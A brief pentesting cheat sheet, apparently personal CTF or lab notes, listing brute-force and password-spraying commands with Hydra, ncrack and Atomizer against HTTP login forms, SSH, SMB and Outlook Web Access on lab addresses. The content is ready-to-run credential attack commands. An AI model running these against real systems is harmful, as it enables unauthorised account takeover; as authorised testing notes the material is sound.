# BruteForce

# Uso de Hydra

## HTTP-POST

```
hydra -C credentials.txt streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"
```

## SSH

```jsx
ncrack -v -U user.txt -P pass.txt ssh://10.10.10.10:<port> -T5
hydra -L users.txt -P pass.txt 192.168.0.114 ssh
```

## SMB

```jsx
ncrack -u qiu -P rockyou.txt -T 5 192.168.0.116 -p smb -v
```

## Atomizer OWA

```
python3 atomizer.py owa 10.10.10.210 'Summer2020' bruteusers
```